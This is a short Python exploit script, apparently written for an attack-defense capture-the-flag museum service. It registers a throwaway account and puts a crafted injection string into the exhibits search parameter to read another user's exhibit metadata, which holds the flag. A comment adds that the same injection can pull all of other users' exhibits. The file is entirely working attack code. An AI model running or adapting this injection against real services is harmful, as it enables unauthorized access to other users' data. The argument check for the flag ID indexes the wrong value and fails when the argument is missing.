#!/usr/bin/env python3

import sys
import requests
import json

IP = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = 6969
PUBLIC_FLAG_ID = sys.argv[2] if len(sys.argv[2]) > 2 else ""


def main():
    api_url = f"http://{IP}:{PORT}"
    public_flag_id = json.loads(PUBLIC_FLAG_ID)
    museum_id, exhibit_id = public_flag_id["museum_id"], public_flag_id["exhibit_id"]

    hacker_token = requests.post(
        f"{api_url}/register",
        json={"name": "cool_haцker", "password": "123"}
    ).json()["token"]

    injection_search = f"' AND id = '{exhibit_id}') AT DATABASE ({museum_id})"
    # also can extract all someone else exhibits

    resp = requests.get(
        f"{api_url}/museum/exhibits?search={injection_search}",
        headers={"token": hacker_token},
    ).json()
    print(resp["exhibits"][0]["metadata"])


if __name__ == '__main__':
    main()
